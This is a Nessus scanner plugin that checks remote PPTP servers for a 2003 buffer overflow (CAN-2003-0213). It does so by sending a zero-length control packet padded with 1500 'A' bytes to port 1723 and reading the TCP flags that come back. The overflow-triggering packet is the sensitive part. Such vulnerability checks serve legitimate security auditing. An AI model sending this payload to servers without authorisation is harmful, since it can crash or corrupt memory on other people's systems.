#
# This script was written by Xue Yong Zhi<xueyong@udel.edu>
#
# See the Nessus Scripts License for details
#

if (description)
{
 script_id(11540);
 script_version ("$Revision: 1.3 $");
 script_name(english:"PPTP overflow");
 script_bugtraq_id(7316);
 script_cve_id("CAN-2003-0213");
 desc["english"] = "
The remote PPTP server has remote buffer overflow vulnerability. 
The problem occurs due to insufficient sanity checks when referencing 
user-supplied input used in various calculations. As a result, it may
be possible for an attacker to trigger a condition where sensitive 
memory can be corrupted. Successful exploitation of this issue may
allow an attacker to execute arbitrary code with the privileges of 
the affected server.

Solution : The vendor has released updated releases of 
PPTP server which address this issue. Users are advised 
to upgrade as soon as possible. 

Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if a remote PPTP server has remote buffer overflow vulnerability");
 script_category(ACT_ATTACK);
 script_family(english:"Gain root remotely");
 script_copyright(english:"This script is Copyright (C) 2003 Xue Yong Zhi");
 script_dependencie("pptp_detect.nasl");
 script_require_ports("Services/pptp",1723);
 exit(0);
}



buffer = 
raw_string(0x00, 0x9C) +
# Length

raw_string(0x00, 0x01) +
# Control packet

raw_string(0x1A, 0x2B, 0x3C, 0x4D) +
# Magic Cookie

raw_string(0x00, 0x01) +
# Control Message = Start Session Request

raw_string(0x00, 0x00) +
# Reserved word 1

raw_string(0x01, 0x00) +
# Protocol version = 256

raw_string(0x00) +
# Reserved byte 1

raw_string(0x00) +
# Reserved byte 2

raw_string(0x00, 0x00, 0x00, 0x01) +
# Framing Capability Summary (Can do async PPP)

raw_string(0x00, 0x00, 0x00, 0x01) +	
# Bearer Capability Summary (Can do analog calls)

raw_string(0x00, 0x00) +
# Max Channels

raw_string(0x08, 0x70) +
# Frimware Revision = 2160

raw_string(
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00) +
# Hostname

raw_string(
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00);
# Vendor string

port = 1723;
if (get_port_state(port))
{
 soc = open_sock_tcp(1723);
 if (soc)
 {
  send(socket:soc, data:buffer);
  rec_buffer = recv(socket:soc, length:156);
  close(soc);
  if("linux" >< rec_buffer)
	{
	buffer = 
	raw_string(0x00, 0x00) +
	# Length = 0

	crap(length:1500, data:'A');
	# Random data
 	soc = open_sock_tcp(port);
 	if (soc)
	 {
  	send(socket:soc, data:buffer);

 	 # Patched pptp server will return RST(will not read bad data), 
  	# unpatched will return FIN(read all the bad data and be overflowed).
 
  	filter = string("tcp and src host ", get_host_ip(), " and dst host ",
  	this_host(), " and src port ", port, " and tcp[13:1]&1!=0 " );

	  for(i=0;i<5;i++) {
   		 r = pcap_next(pcap_filter:filter, timeout:2);
    		if(r)  {security_note(port); exit(0);} 
                }
         }
    }
  }
}
